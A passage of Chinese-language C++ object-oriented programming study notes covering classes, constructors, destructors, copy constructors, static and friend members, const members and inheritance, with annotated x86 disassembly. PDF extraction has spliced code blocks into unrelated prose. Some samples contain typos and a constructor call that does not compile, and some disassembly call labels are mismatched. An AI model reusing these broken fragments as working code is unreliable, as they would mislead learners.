<p>&lt;&lt; k &lt;&lt; endl;</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p>}</p>
<p>cout&lt;&lt;&quot;总共排列种类有：&quot;&lt;&lt;sum&lt;&lt;&quot;种&quot;&lt;&lt;endl;</p>
<p>return 0;</p>
<p>}结构体的扩充</p>
<p>C++语言对C的结构体类型进行了扩充，不仅可以含有数据，还可以含有函数，结构体中的数据叫做数</p>
<p>据成员，函数则叫成员函数。</p>
<p>访问成员函数需要先定义该结构体类型的变量。</p>
<p>结构体的声明例如：</p>
<p>调用成员函数：</p>
<p><strong>类的声明</strong></p>
<p>struct npc{</p>
<p>int hp;</p>
<p>int mp;</p>
<p>void initv(int hp_value,int mp_value){</p>
<p>hp = hp_value;</p>
<p>mp = mp_value;</p>
<p>}</p>
<p>};</p>
<p>npc A;</p>
<p>A.initv(100,100);C++提供了一种比结构体更安全有效的类型：类，与结构体的扩充十分相似，结构体是为了兼容C而进</p>
<p>行了扩充，类是C++风格的数据类型</p>
<p>类与结构体的扩充功能几乎一样，但有一点不同：类默认成员是private属性，结构体默认是public属</p>
<p>性，类提供了默认的安全性。</p>
<p>private和public是成员限定符，声明成员的访问属性。</p>
<p>声明一个类相当于声明了一个类型。</p>
<p>类的声明一般如下：</p>
<p>成员限定符有三种：</p>
<p>private：私有成员只能由本类的成员函数访问，类外部的访问都是非法的</p>
<p>public：公有成员既可以由本类成员访问，也可以由外部访问</p>
<p>是对外界的接口，来自类外的对私有成员的访问需要通过接口进行</p>
<p>protected：保护成员可以由本类成员函数访问，也可以由派生类成员函数访问</p>
<p>类声明中的这三个部分不需要全都有，也没有顺序限制</p>
<p>数据成员不能用自动、寄存器和外部进行说明</p>
<p><strong>成员函数的定义</strong></p>
<p>类的成员函数是函数的一种，用法与普通函数一样</p>
<p>私有的成员函数只能被本类中的其他成员函数调用，不能被外部访问，公有的都行</p>
<p><strong>定义方式<strong><strong>1</strong></strong>：普通成员函数</strong></p>
<p>在类声明中给出成员函数原型，而将成员函数定义在类的外部</p>
<p>形式如下：</p>
<p>作用域运算符 :: 表示该函数属于类</p>
<p>在类声明中，成员函数原型参数表可以只写类型</p>
<p>在外部声明，成员函数定义需要写出参数名</p>
<p><strong>定义方式<strong><strong>2</strong></strong>：内联成员函数</strong></p>
<p>可以直接将成员函数定义在类的内部，这种定义方式没有使用inline进行声明，属于隐式定义。</p>
<p>也可以在类内声明函数原型，在类外定义函数，但在类内函数原型声明和类外函数定义处需要加上</p>
<p>inline，这是显式定义（可以两处都写inline，也可以只写一处）。</p>
<p>定义内联函数时，必须将类的声明和内联函数的定义放在同一个文件中。</p>
<p>class 类名{</p>
<p>private:</p>
<p>私有成员;</p>
<p>public:</p>
<p>公有成员;</p>
<p>};</p>
<p>返回值类型 类名：：成员函数名（参数表）{</p>
<p>函数体</p>
<p>}<strong>对象的定义以及使用</strong></p>
<p>对象的定义由以下两种方法：</p>
<p>\1. 直接在声明的同时进行定义,只需要在定义完成的右括号后面写上变量名即可</p>
<p>\2. 声明了类以后，使用类名进行定义 类名 对象名;</p>
<p>对对象中成员的访问由以下三种方法：</p>
<p>\1. 使用对象选择符 . 进行访问</p>
<p>\2. 如果定义的时对象指针，则需要通过 -&gt; 进行访问</p>
<p>\3. 也可以通过引用访问对象中的成员</p>
<p>程序示例：对象中成员的访问</p>
<p>class npc{</p>
<p>private:</p>
<p>int hp;</p>
<p>int mp;</p>
<p>public:</p>
<p>int initv();</p>
<p>}npcA,npcB;</p>
<p>npc npcA;</p>
<p>对象.数据成员</p>
<p>对象.成员函数(参数表)</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class Point {</p>
<p>private:</p>
<p>int x;</p>
<p>int y;</p>
<p>public:</p>
<p>void setpoint(int a, int b) {</p>
<p>x = a;</p>
<p>y = b;</p>
<p>}</p>
<p>int getx() {</p>
<p>return x;</p>
<p>}</p>
<p>int gety() {</p>
<p>return y;</p>
<p>}</p>
<p>};</p>
<p>int main() {</p>
<p>Point op1;</p>
<p>op1.setpoint(1, 2);</p>
<p>int op1x;</p>
<p>op1x = op1.getx();</p>
<p>cout &lt;&lt; op1x &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}反汇编分析：</p>
<p>Point op1;</p>
<p>op1.setpoint(1, 2);</p>
<p>001918F2 push 2</p>
<p>001918F4 push 1</p>
<p>001918F6 lea ecx,[op1]</p>
<p>001918F9 call std::basic_ostream&lt;char,std::char_traits<char></p>
<p>&gt;::_Sentry_base::~_Sentry_base (0191447h)</p>
<p>;参数入栈，将对象op1的地址存到ecx，调用成员函数</p>
<p>;成员函数</p>
<p>void setpoint(int a, int b) {</p>
<p>...</p>
<p>;此处省略函数调用前的初始化，this是对象op1的首地址</p>
<p>x = a;</p>
<p>0019211D mov eax,dword ptr [this]</p>
<p>;将对象x数据成员首地址拿出来</p>
<p>00192120 mov ecx,dword ptr [a]</p>
<p>;把a的值拿出来</p>
<p>00192123 mov dword ptr [eax],ecx</p>
<p>;给对象x数据成员赋值</p>
<p>y = b;</p>
<p>00192125 mov eax,dword ptr [this]</p>
<p>00192128 mov ecx,dword ptr [b]</p>
<p>0019212B mov dword ptr [eax+4],ecx</p>
<p>}</p>
<p>int op1x;</p>
<p>op1x = op1.getx();</p>
<p>001918FE lea ecx,[op1]</p>
<p>00191901 call std::basic_ostream&lt;char,std::char_traits<char></p>
<p>&gt;::sentry::sentry (019144Ch)</p>
<p>;把对象地址存入ecx，进入函数调用</p>
<p>;函数调用</p>
<p>int getx(){</p>
<p>...</p>
<p>00191F9F pop ecx</p>
<p>00191FA0 mov dword ptr [this],ecx</p>
<p>;把ecx取出来，放到this指针里</p>
<p>00191FA3 mov ecx,19F026h</p>
<p>00191FA8 call @__CheckForDebuggerJustMyCode@4 (019127Bh)</p>
<p>return x;</p>
<p>00191FAD mov eax,dword ptr [this]</p>
<p>00191FB0 mov eax,dword ptr [eax]</p>
<p>;把指针的地址存入eax，然后将该地址的值赋给eax</p>
<p>}</p>
<p>00191906 mov dword ptr [op1x],eax</p>
<p>;从eax取出刚刚函数调用得到的值x，存入变量op1x中</p>
<p>cout &lt;&lt; op1x &lt;&lt; endl;</p>
<p>00191909 mov esi,espthis指针相关见this指针</p>
<p><strong>对象初始化</strong></p>
<p>对象初始化方法如下：</p>
<p>通过构造函数来对数据成员进行赋值操作</p>
<p>当数据成员为const或引用类型，则需要通过成员初始化列表对数据成员初始化</p>
<p><strong>构造函数</strong></p>
<p>在类的声明中不能给数据成员赋值。</p>
<p>在定义对象时给数据成员赋值叫做对象的初始化。</p>
<p>如果一个类所有成员都是公有的，则可以通过类似结构体初始化的方式赋值：</p>
<p>也可以采用公有成员函数来对数据成员进行赋初值。</p>
<p>C++提供了构造函数来进行初始化工作：</p>
<p>构造函数名字必须与类名相同</p>
<p>可以有任意类型参数</p>
<p>不能有返回值</p>
<p>不需要调用，创建对象时自动执行，且只执行一次</p>
<p>可以写在类内（内联函数）也可以写在类外</p>
<p>0019190B push offset std::operator&lt;&lt;&lt;std::char_traits<char> &gt; (01912A8h)</p>
<p>00191910 mov edi,esp</p>
<p>00191912 mov eax,dword ptr [op1x]</p>
<p>00191915 push eax</p>
<p>00191916 mov ecx,dword ptr [<em>imp</em>?cout@std@@3V?$basic_ostream@DU?</p>
<p>$char_traits@D@std@@@1@A (019D0D8h)]</p>
<p>;先后入栈endl和变量op1x</p>
<p>0019191C call dword ptr</p>
<p>[__imp_std::basic_ostream&lt;char,std::char_traits<char> &gt;::operator&lt;&lt; (019D0A0h)]</p>
<p>00191922 cmp edi,esp</p>
<p>00191924 call __RTC_CheckEsp (0191285h)</p>
<p>00191929 mov ecx,eax</p>
<p>0019192B call dword ptr</p>
<p>[__imp_std::basic_ostream&lt;char,std::char_traits<char> &gt;::operator&lt;&lt; (019D0A4h)]</p>
<p>cout &lt;&lt; op1x &lt;&lt; endl;</p>
<p>;连续两次调用显示函数，依次显示变量和换行</p>
<p>00191931 cmp esi,esp</p>
<p>00191933 call __RTC_CheckEsp (0191285h)</p>
<p>return 0;</p>
<p>00191938 xor eax,eax</p>
<p>}</p>
<p>class npc{</p>
<p>public:</p>
<p>int hp;</p>
<p>int mp;</p>
<p>};</p>
<p>npc npcA(100,100);一般声明为公有成员</p>
<p>构造函数可以不带参数，但这样对对象的初始化时固定的</p>
<p>定义形式如下：</p>
<p><strong>用成员初始化列表对数据成员初始化</strong></p>
<p>当数据成员为const或引用类型，则需要通过成员初始化列表对数据成员初始化</p>
<p>一般形式如下：</p>
<p>数据成员是按照他们在类中声明的顺序进行初始化，与成员初始化列表出现顺序无关。</p>
<p>从反汇编来看，操作与函数赋值一样。</p>
<p><strong>构造函数的重载</strong></p>
<p>与普通函数一样，构造函数也能进行重载，对每一个对象来说，构造函数只会执行一次，比如当创建对</p>
<p>象通过参数给数据成员赋值，不提供参数赋值默认值，提供参数则赋值参数值。</p>
<p>使用无参数构造函数创建对象时（比如类是Point），应该用语句 Point OP1; 而不加后面的括号，使用</p>
<p>参数赋值的话则是 Point OP2(2,3);</p>
<p><strong>带默认参数的构造函数</strong></p>
<p>对于带参数的构造函数，可以直接定义成带默认参数的构造函数。</p>
<p>构造函数的重载和有默认参数的构造函数不能同时用。</p>
<p>如果构造函数在类外进行定义，则默认参数应该写在类内的函数原型里：</p>
<p>//类名 对象名(实参表);</p>
<p>//类名 * 指针变量名 = new 类名(实参表);</p>
<p>//定义无名对象，通过指针访问，new建立，不用时用delete删除</p>
<p>/*</p>
<p>类名::构造函数名([参数表])[成员初始化列表]{</p>
<p>构造函数体</p>
<p>}</p>
<p>*/</p>
<p>//成员初始化列表形式为：</p>
<p>//数据成员1（初始值1），数据成员2（初始值2）...</p>
<p>calss A{</p>
<p>public:</p>
<p>A(int a,int b):a(0),b(1){}</p>
<p>private:</p>
<p>int a;</p>
<p>int b;</p>
<p>}<strong>析构函数</strong></p>
<p>与构造函数相对的是析构函数，用来清理空间。</p>
<p>析构函数：</p>
<p>析构函数名与类名相同，但前面需要加一个波浪号~</p>
<p>同构造函数，不返回任何值，不用写返回值类型</p>
<p>析构函数没有参数，不能被重载</p>
<p>撤销对象时，系统自动调用析构函数</p>
<p>每个类必须有一个析构函数</p>
<p>在以下情况，析构函数也会被调用：</p>
<p>如果对象被定义在一个函数里，当这个函数调用结束，对象将被释放，析构函数自动调用</p>
<p>如果对象时使用new运算符动态创建的，当使用delete释放的时候会调用析构函数</p>
<p>程序实例：构造函数与析构函数</p>
<p>反汇编分析：</p>
<p>calss A{</p>
<p>public:</p>
<p>A(int a=1,int b=2);</p>
<p>private:</p>
<p>int a;</p>
<p>int b;</p>
<p>}</p>
<p>A::A(int a,int b){</p>
<p>//函数体</p>
<p>}</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class addnum {</p>
<p>public:</p>
<p>addnum(int a, int b) :x(a), y(b) {</p>
<p>cout &lt;&lt; &quot;constructor&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>~addnum() {</p>
<p>cout &lt;&lt; &quot;destructor&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>int getxaddy() {</p>
<p>return x + y;</p>
<p>}</p>
<p>private:</p>
<p>int x;</p>
<p>int y;</p>
<p>};</p>
<p>int main() {</p>
<p>addnum* p;</p>
<p>p = new addnum(1,2);</p>
<p>int c = p-&gt;getxaddy();</p>
<p>delete p;</p>
<p>return 0;</p>
<p>}addnum* p;</p>
<p>p = new addnum(1,2);</p>
<p>00B82857 push 8</p>
<p>00B82859 call operator new (0B813B1h)</p>
<p>00B8285E add esp,4</p>
<p>;开辟一片空间，将成功与否写在eax里</p>
<p>00B82861 mov dword ptr [ebp-0F8h],eax</p>
<p>00B82867 mov dword ptr [ebp-4],0</p>
<p>00B8286E cmp dword ptr [ebp-0F8h],0</p>
<p>00B82875 je main+7Eh (0B8288Eh)</p>
<p>;eax的值存在ebp-0F0h里，如果这里的值等于0，则跳转到main+7h</p>
<p>00B82877 push 2</p>
<p>00B82879 push 1</p>
<p>00B8287B mov ecx,dword ptr [ebp-0F8h]</p>
<p>00B82881 call addnum::addnum (0B81384h)</p>
<p>;参数入栈函数调用</p>
<p>addnum(int a, int b) :x(a), y(b) {</p>
<p>00B820E0 mov dword ptr [this],ecx</p>
<p>00B820E3 mov ecx,offset _580C3C40_main@cpp (0B8F026h)</p>
<p>00B820E8 call @__CheckForDebuggerJustMyCode@4 (0B812DAh)</p>
<p>;把ecx（申请的空间首地址）存入this指针，然后进行一个检查，不管他</p>
<p>00B820ED mov eax,dword ptr [this]</p>
<p>00B820F0 mov ecx,dword ptr [a]</p>
<p>00B820F3 mov dword ptr [eax],ecx</p>
<p>;存入变量a</p>
<p>00B820F5 mov eax,dword ptr [this]</p>
<p>00B820F8 mov ecx,dword ptr [b]</p>
<p>00B820FB mov dword ptr [eax+4],ecx</p>
<p>;往后挪4位存入变量b</p>
<p>...</p>
<p>;省略cout部分</p>
<p>00B82886 mov dword ptr [ebp-100h],eax</p>
<p>; eax是创建的对象的首地址</p>
<p>00B8288C jmp main+88h (0B82898h)</p>
<p>00B8288E mov dword ptr [ebp-100h],0 ;这行被跳过，在申请空间失败的时候会跳转到</p>
<p>此处</p>
<p>00B82898 mov eax,dword ptr [ebp-100h]</p>
<p>;ebp-100h是对象首地址，存入eax</p>
<p>00B8289E mov dword ptr [ebp-0ECh],eax</p>
<p>00B828A4 mov dword ptr [ebp-4],0FFFFFFFFh</p>
<p>00B828AB mov ecx,dword ptr [ebp-0ECh]</p>
<p>00B828B1 mov dword ptr [p],ecx</p>
<p>;将对象首地址存入指针p中</p>
<p>int c = p-&gt;getxaddy();</p>
<p>00B828B4 mov ecx,dword ptr [p]</p>
<p>00B828B7 call addnum::getxaddy (0B810FAh)</p>
<p>00B828BC mov dword ptr [c],eax</p>
<p>;调用函数将返回值存入eax，从eax取出存入变量c</p>
<p>delete p;</p>
<p>008D653F mov eax,dword ptr [p]</p>
<p>008D6542 mov dword ptr [ebp-104h],eax</p>
<p>008D6548 cmp dword ptr [ebp-104h],0</p>
<p>008D654F je main+0D6h (08D6566h)</p>
<p>;判断p是否是空指针，是就跳转构造函数负责初始化数据成员，析构函数用来清除对对象的指向清理空间</p>
<p><strong>对象数组</strong></p>
<p>就是由对象组成的数组，每个元素是一个对象，每个元素创建的时候会调用构造函数，删除时调用析构</p>
<p>函数。</p>
<p>由对象构成的数组，如果构造函数只有一个参数可通过以下方式来赋值</p>
<p>可通过构造函数的重载来设置有一个参数和没有参数的赋值，在定义对象数组时，如下，前两个对象调</p>
<p>用有参数的构造函数，后两个对象调用无参数构造函数：</p>
<p>如果构造函数有多个参数，可以这样定义对象数组：</p>
<p><strong>对象指针</strong></p>
<p>指针就是通过内存地址访问对象</p>
<p><strong>用指针访问单个对象成员</strong></p>
<p>008D6551 push 1</p>
<p>008D6553 mov ecx,dword ptr [ebp-104h]</p>
<p>008D6559 call addnum::`scalar deleting destructor' (08D14BAh)</p>
<p>;析构函数调用</p>
<p>008D655E mov dword ptr [ebp-10Ch],eax</p>
<p>008D6564 jmp main+0E0h (08D6570h)</p>
<p>008D6566 mov dword ptr [ebp-10Ch],0</p>
<p>return 0;</p>
<p>008D6570 xor eax,eax</p>
<p>}</p>
<p>008D1F00 mov dword ptr [this],ecx</p>
<p>008D1F03 mov ecx,dword ptr [this]</p>
<p>008D1F06 call addnum::~addnum (08D14B5h)</p>
<p>;调用析构函数之后，p指针不见了，然后内存的内容还在</p>
<p>008D1F0B mov eax,dword ptr [ebp+8]</p>
<p>008D1F0E and eax,1</p>
<p>008D1F11 je addnum::`scalar deleting destructor'+41h (08D1F21h)</p>
<p>008D1F13 push 8</p>
<p>008D1F15 mov eax,dword ptr [this]</p>
<p>008D1F18 push eax</p>
<p>008D1F19 call operator delete (08D12CBh)</p>
<p>;调用delete操作后，内存空间的内容被覆盖清空</p>
<p>008D1F1E add esp,8</p>
<p>008D1F21 mov eax,dword ptr [this]</p>
<p>point ob1[4]={1,2,3,4};</p>
<p>point ob1[4]={1,2};</p>
<p>point ob2[2]={</p>
<p>point(1,2,3),</p>
<p>point(2,3,4)</p>
<p>}一般用 . 来访问对象成员，用指针访问的话用 -&gt;</p>
<p><strong>用对象指针访问对象数组</strong></p>
<p>定义一个对象指针，把对象数组赋值给对象指针：</p>
<p>这时p指向数组第一个元素的地址，当p+1则指向下一个元素的地址（地址偏移量不用自己算）</p>
<p><strong>this****指针</strong></p>
<p>从一个类中建立多个对象之后，不同对象的数据成员是不同的，会占用不同的内存空间，但是成员函数</p>
<p>一般是一样的，所以共用一块内存空间</p>
<p>this指针也叫自引用指针，在对对象进行函数调用的时候，程序会往this指针赋值为当前对象的首地</p>
<p>址，所以调用的时候，this可以区分不同对象的数据</p>
<p><strong>string</strong> <strong>类</strong></p>
<p>C++支持两种类型的字符串：</p>
<p>\1. C语言中的以\0结尾的字符数组</p>
<p>\2. C++表转库中的string类型</p>
<p>前者可以混在后者里进行运算</p>
<p>运算符同普通变量一样</p>
<p>使用string需要包含库文件： #include<string></p>
<p>定义和初始化：</p>
<p><strong>向函数传递对象</strong></p>
<p><strong>使用对象作为参数</strong></p>
<p>把实参赋给形参，形参进行改变，但不改变实参本身，是一种单向传递。</p>
<p>实际上是调用拷贝构造函数用实参初始化形参，详见拷贝构造函数</p>
<p><strong>使用对象指针作为参数</strong></p>
<p>把对象地址作为参数，函数改变的则是地址的内容，会改变对象本身。</p>
<p><strong>使用对象引用作为参数</strong></p>
<p>把对象引用作为参数，对象引用其实就是对象本身，函数改变的也是对象本身。</p>
<p><strong>对象的赋值</strong></p>
<p>当两个对象类型相同时，可通过 = 进行赋值：</p>
<p>point arr[4];</p>
<p>point* p;</p>
<p>p = arr;</p>
<p>string str1;</p>
<p>string str2(&quot;123&quot;);</p>
<p>string str3=&quot;1234&quot;;赋值操作仅仅是让两个对象的数据成员相同。</p>
<p>赋值通过赋值运算符函数实现（第五章）</p>
<p>当类中存在指针，可能会发生错误。</p>
<p><strong>拷贝构造函数</strong></p>
<p>拷贝构造函数是一种特殊的构造函数：</p>
<p>形参时本类对象的引用，和构造函数一样没有返回值类型，函数名为类名，可以自定义，也可以默</p>
<p>认生成，但必须有</p>
<p>用于在建立新的对象时用本对象去进行初始化</p>
<p><strong>自定义拷贝构造函数</strong></p>
<p>我们可以选择自己去定义拷贝构造函数，用一个对象去初始化另一个对象</p>
<p>初始化有两种方式：</p>
<p>类名 对象2（对象1）;</p>
<p>类名 对象2=对象1;</p>
<p>示例：</p>
<p>B=A</p>
<p>#include<iostream></p>
<p>using namespace std;</p>
<p>class point {</p>
<p>public:</p>
<p>point(int a, int b) :x(a), y(b) {}</p>
<p>point(point&amp; p) {</p>
<p>x = p.x + 1;</p>
<p>y = p.y + 2;</p>
<p>} //拷贝构造函数传递的参数是本类的对象</p>
<p>int getsum() {</p>
<p>return x + y;</p>
<p>}</p>
<p>private:</p>
<p>int x, y;</p>
<p>};</p>
<p>int main() {</p>
<p>point op1(1, 2);</p>
<p>point op2 = op1;//初始化方法1</p>
<p>point op3(op2);//初始化方法2</p>
<p>cout &lt;&lt; op1.getsum() &lt;&lt; endl;</p>
<p>cout &lt;&lt; op2.getsum() &lt;&lt; endl;</p>
<p>cout &lt;&lt; op3.getsum() &lt;&lt; endl;</p>
<p>return 0;</p>
<p>}<strong>默认拷贝构造函数</strong></p>
<p>如果没有自定义拷贝构造函数，则系统会自动生成一个拷贝构造函数，用于将对象的数据成员一一赋</p>
<p>值。</p>
<p>如果类中有指针类型，调用默认拷贝构造函数可能会报错。</p>
<p><strong>调用拷贝构造函数的三种清空</strong></p>
<p>\1. 用类中的一个对象初始化另一个对象时</p>
<p>\2. 函数的形参是对象时</p>
<p>\3. 当函数的返回值时对象时</p>
<p>此时，函数执行结束后会将数值存到临时对象里，用于接收返回值对象的赋值，赋值完成后，临时</p>
<p>对象也会消失</p>
<p><strong>静态成员</strong></p>
<p>用于实现一个类中各个对象之间的的成员共享，C++提出了静态成员的概念</p>
<p><strong>静态数据成员</strong></p>
<p>将类内的数据成员定义前面加上 static ，则定义为静态数据成员</p>
<p>静态数据成员相当于类内的“全局变量”</p>
<p>初始化需要在类外单独进行，通过 类型 类名：：变量名 来进行访问</p>
<p>公有的静态数据成员可通过 ：： 来访问，也可通过对象访问，私有的静态数据成员只能通过公有的成员</p>
<p>函数进行访问。</p>
<p><strong>静态成员函数</strong></p>
<p>将类内的成员函数<strong>原型声明前面</strong>加上 static ，则定义为静态成员函数</p>
<p>是类中所有对象的共享函数，用于访问静态数据成员</p>
<p>私有静态成员函数不能做类外的函数和对象访问</p>
<p>可以用在定义对象之前调用，处理静态数据成员</p>
<p>编译系统将静态成员函数限定为内部连接</p>
<p>静态成员函数没有this指针，如果用来访问非静态成员，可以通过将目标的引用作为参数输入</p>
<p><strong>示例</strong></p>
<p>运行结果：</p>
<p>3</p>
<p>6</p>
<p>9</p>
<p>#include<iostream></p>
<p>#include<string></p>
<p>using namespace std;</p>
<p>class stu_information {</p>
<p>public:</p>
<p>stu_information(string name, float score);<strong>友元</strong></p>
<p>void show();</p>
<p>static void showall();</p>
<p>private:</p>
<p>string name;//名字</p>
<p>float score;//分数</p>
<p>static float average_sum;//平均分数</p>
<p>static int count;//人数</p>
<p>static float sum;//分总和</p>
<p>};</p>
<p>stu_information::stu_information(string name1, float score1) {</p>
<p>name = name1;</p>
<p>score = score1;</p>
<p>count++;</p>
<p>sum += score;</p>
<p>average_sum = sum / count;</p>
<p>}</p>
<p>void stu_information::show() {</p>
<p>cout &lt;&lt; name &lt;&lt; &quot;:&quot; &lt;&lt; score &lt;&lt; endl;</p>
<p>}</p>
<p>void stu_information::showall() { //访问静态数据成员</p>
<p>cout &lt;&lt; &quot;----------&quot; &lt;&lt; endl;</p>
<p>cout &lt;&lt; &quot;总人数：&quot; &lt;&lt; count &lt;&lt; endl;</p>
<p>cout &lt;&lt; &quot;平均分：&quot; &lt;&lt; average_sum &lt;&lt; endl;</p>
<p>cout &lt;&lt; &quot;----------&quot; &lt;&lt; endl;</p>
<p>}</p>
<p>//初始化静态数据成员</p>
<p>int stu_information::count = 0;</p>
<p>float stu_information::sum = 0.0;</p>
<p>float stu_information::average_sum = 0.0;</p>
<p>int main() {</p>
<p>stu_information::showall();</p>
<p>stu_information stu1(&quot;张三&quot;,88);</p>
<p>stu_information* stu2 = new stu_information(&quot;张四&quot;,93);</p>
<p>stu1.show();</p>
<p>stu2-&gt;show();</p>
<p>stu_information::showall();</p>
<p>return 0;</p>
<p>}</p>
<p>运行结果：</p>
<p>----------</p>
<p>总人数：0</p>
<p>平均分：0</p>
<p>----------</p>
<p>张三:88</p>
<p>张四:93</p>
<p>----------</p>
<p>总人数：2</p>
<p>平均分：90.5</p>
<p>----------友元是用来在类外访问类内的私有部分的辅助手段。</p>
<p>声明了友元函数的类中的数据可以被友元函数访问。</p>
<p><strong>友元函数</strong></p>
<p>友元函数是类外的一个函数，需要在类内函数声明前面加上 friend 来标识，参数接收类的对象，可用</p>
<p>于访问该类的私有数据成员。</p>
<p>一个函数需要访问多个类的时候，友元函数就很方便。</p>
<p><strong>将非成员函数声明成友元函数</strong></p>
<p><strong>将成员函数声明成友元函数</strong></p>
<p>一个类想要通过自己的成员函数访问另一个类的私有数据成员，可通过往另一个类中声明友元函数来实</p>
<p>现。</p>
<p>#include<iostream></p>
<p>#include<string></p>
<p>using namespace std;</p>
<p>class gril {</p>
<p>public:</p>
<p>gril(string name1, int age1) {</p>
<p>name = name1;</p>
<p>age = age1;</p>
<p>}</p>
<p>friend void disp(const gril&amp;);//友元函数声明</p>
<p>private:</p>
<p>string name;</p>
<p>int age;</p>
<p>};</p>
<p>void disp(const gril&amp; x) {//友元函数定义</p>
<p>cout &lt;&lt; x.name &lt;&lt; &quot;:&quot; &lt;&lt; x.age &lt;&lt; endl;//访问对象的数据时需要用对象名.成员来进行访</p>
<p>问</p>
<p>}</p>
<p>int main() {</p>
<p>gril A(&quot;LiHua&quot;, 15);</p>
<p>disp(A);</p>
<p>return 0;</p>
<p>}</p>
<p>LiHua:15</p>
<p>#include<iostream></p>
<p>#include<string></p>
<p>using namespace std;</p>
<p>class boy;</p>
<p>class gril {</p>
<p>public:</p>
<p>gril(string name1, int age1) {</p>
<p>name = name1;</p>
<p>age = age1;<strong>友元类</strong></p>
<p>类之间也可以做友元，通过 friend 类名 来声明，可以声明在私有部分也可以在公有部分。</p>
<p>一个类作为另一个类的友元，相当与把一个类的成员函数都变成了另一个类的友元函数：</p>
<p>也就是：写friend的地方的成员可以被friend后面跟着的类或函数所访问</p>
<p>说明：</p>
<p>友元关系是单向的，写friend的那个类只能被访问</p>
<p>友元关系不具有传递性，A是B的友元，B是C的友元，A不是C的友元</p>
<p><strong>类的组合</strong></p>
<p>可以用一个类的对象作为另一个类的成员，称为类的组合，内嵌对象称为对象成员，也叫子对象。</p>
<p>对象成员的初始化通过构造函数初始化表来进行（类似于前面提到的成员初始化列表）。</p>
<p>构造函数会依次对成员进行初始化然后再执行函数体内容</p>
<p>}</p>
<p>void disp(boy&amp; );//disp为类gril的成员函数</p>
<p>private:</p>
<p>string name;</p>
<p>int age;</p>
<p>};</p>
<p>class boy {</p>
<p>public:</p>
<p>boy(string name1, int age1) {</p>
<p>name = name1;</p>
<p>age = age1;</p>
<p>}</p>
<p>friend void gril::disp(boy&amp;);//作为boy的友元函数，可以访问boy的私有成员</p>
<p>private:</p>
<p>string name;</p>
<p>int age;</p>
<p>};</p>
<p>void gril::disp(boy&amp; x) { //成员函数声明</p>
<p>cout &lt;&lt; name &lt;&lt; &quot;:&quot; &lt;&lt; age &lt;&lt; endl;</p>
<p>cout &lt;&lt; x.name &lt;&lt; &quot;:&quot; &lt;&lt; x.age &lt;&lt; endl;</p>
<p>}</p>
<p>int main() {</p>
<p>gril A(&quot;LiHua&quot;, 15);</p>
<p>boy B(&quot;ZhangSan&quot;, 42);</p>
<p>A.disp(B);</p>
<p>return 0;</p>
<p>}</p>
<p>LiHua:15</p>
<p>ZhangSan:42</p>
<p>#include<iostream>其中，构造函数：</p>
<p>对象定义：</p>
<p><strong>常类型</strong></p>
<p><strong>常引用</strong></p>
<p>说明引用时前面用const修饰</p>
<p>用于作函数的形参，可以避免对实参的修改</p>
<p><strong>常对象</strong></p>
<p>说明对象时前面用const修饰</p>
<p>数据成员的值在整个生存周期不能被改变，在定义时必须进行初始化</p>
<p><strong>常数据成员</strong></p>
<p>#include<string></p>
<p>using namespace std;</p>
<p>class sorces {</p>
<p>private:</p>
<p>float computer;</p>
<p>float english;</p>
<p>float math;</p>
<p>public:</p>
<p>sorces(float c, float e, float m):computer(c),english(e),math(m){}</p>
<p>void dispc() {</p>
<p>cout &lt;&lt; computer &lt;&lt; endl;</p>
<p>}</p>
<p>};</p>
<p>class stuinfo {</p>
<p>private:</p>
<p>string name;</p>
<p>sorces sorce;</p>
<p>public:</p>
<p>stuinfo(string n, float c, float e, float m) :name(n), sorce(c, e, m) {}</p>
<p>void dispc() {</p>
<p>cout &lt;&lt; name &lt;&lt; endl;</p>
<p>sorce.dispc();</p>
<p>}</p>
<p>};</p>
<p>int main() {</p>
<p>stuinfo A(&quot;LiHua&quot;, 66, 77, 88);</p>
<p>A.dispc();</p>
<p>return 0;</p>
<p>}</p>
<p>stuinfo(string n, float c, float e, float m) :name(n), sorce(c, e, m) {}</p>
<p>stdinfo A(&quot;LiHua&quot;,66,77,88);说明数据成员时前面用const修饰</p>
<p>只能通过成员初始化列表进行初始化，任何函数都不能进行赋值</p>
<p><strong>常成员函数</strong></p>
<p>说明成员函数时<strong>后面</strong>用const修饰</p>
<p>在声明函数和定义函数的时候都要用关键字const说明</p>
<p>常成员函数可以访问常数据成员也可以访问普通数据成员</p>
<p>常对象只能调用常成员函数，且常成员函数不能更新数据成员的值</p>
<p><strong>第四章：派生类与继承</strong></p>
<p>继承，允许在已有类的基础上创建新的类，新类可以从一个或多个已有类中继承函数和数据，还可以加</p>
<p>进新的成员</p>
<p>已有类称为基类或父类，新类称为派生类或子类。</p>
<p><strong>派生类的构成</strong></p>
<p>构造一个派生类分以下三部分工作：</p>
<p>\1. 派生类从基类接收全部成员（除构造函数和析构函数，这两个需要在派生类重新定义）</p>
<p>\2. 调整从基类接收的成员</p>
<p>\1. 改变成员的访问属性（通过声明的继承方式来改变）</p>
<p>\2. 对基类成员进行重定义（使用相同成员名可覆盖原成员，函数需要参数表也相同）</p>
<p>\3. 在派生类增加新的成员</p>
<p><strong>派生类的声明</strong></p>
<p>class 派生类名：[继承方式] 基类名{</p>
<p>新增的数据成员和成员函数</p>
<p>}继承有三类：</p>
<p>public：公有继承【除了私有成员以外的所有成员访问属性不变】</p>
<p>private：私有继承【除了私有成员以外的所有成员访问属性变私有】</p>
<p>protected：保护继承【除了私有成员以外的所有成员访问属性变保护】</p>
<p>私有成员继承后均变不可访问属性</p>
<p>访问属性：</p>
<p>公有：可内部和外部访问</p>
<p>私有：仅可本类内部访问，不可外部访问</p>
<p>保护：可本类和派生类内部访问，不可外部访问</p>
<p><strong>派生类对基类成员访问规则</strong></p>
<p><strong>私有继承的访问规则</strong></p>
<p>私有继承后，基类公有、保护成员全变私有，私有变不可访问</p>
<p>在派生类中只能通过父类的成员函数来访问父类的私有成员</p>
<p>私有继承之后，再次继承会使得父类成员全部不可访问</p>
<p><strong>公有继承的访问规则</strong></p>
<p>公有继承后，基类公有、保护成员属性不变，私有变不可访问</p>
<p>在派生类中只能通过父类的成员函数来访问父类的私有成员</p>
<p><strong>保护继承的访问规则</strong></p>
<p>保护继承后，基类公有、保护成员全变保护，私有变不可访问</p>
<p>举例：继承的使用</p>
<p>#include<iostream></p>
<p>#include<string></p>
